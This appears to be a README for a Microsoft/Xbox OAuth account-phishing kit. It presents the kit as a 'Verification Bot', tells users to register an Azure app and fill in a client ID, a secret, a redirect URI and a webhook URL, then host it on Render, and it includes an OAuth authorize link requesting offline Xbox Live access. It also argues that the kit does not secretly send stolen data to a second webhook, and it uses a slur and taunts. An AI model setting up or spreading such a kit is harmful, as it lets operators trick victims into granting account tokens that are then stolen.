

## MADE BY NORMI N40R2I#8855 and me ofc xd L BOZO


FOR RETARDS WHO TINK ITS DOUBLEHOOKED LOOK ![image](https://user-images.githubusercontent.com/107274162/204852826-c230a8e8-188a-4b32-9c7c-e4a64cd2a50c.png)

THIS THING RIGHT THERE IS THE MF WHO SENDS THE EMBED TO THE WEBHOOK, IF IT WAS DOUBLEHOOKED IT WOULD LOOK LIKE THIS : ![image](https://user-images.githubusercontent.com/107274162/204853039-01ca2a38-316a-4c5a-9085-3f8faf7fe408.png)

HERE IT POSTS TO 2 DIFFERENT WEBHOOKS. NOW CRY

https://login.live.com/oauth20_authorize.srf?client_id=[CLIENT-ID]&response_type=code&redirect_uri=[REDIRECT-URI]&scope=XboxLive.signin+offline_access&state=NOT_NEEDED


## Written Tutorial

1. Fork this repo  
2. Make a Microsoft Azure Application Registration https://portal.azure.com/  
       - create a new app registration  
       - name it something like "Verification Bot"  
       - choose Personal Microsoft account, or a work or school account  
       - link your heruko application  
      
3. Configure in index.js  
       - you need to change: 
          + secret_value  
          + client_id  
          + redirect_uri  
          + webhook_url  
            
4. Host the repo you forked on https://dashboard.render.com/ (WEB SERVICE) link to github and link the repo and just put a name and dont change anything else
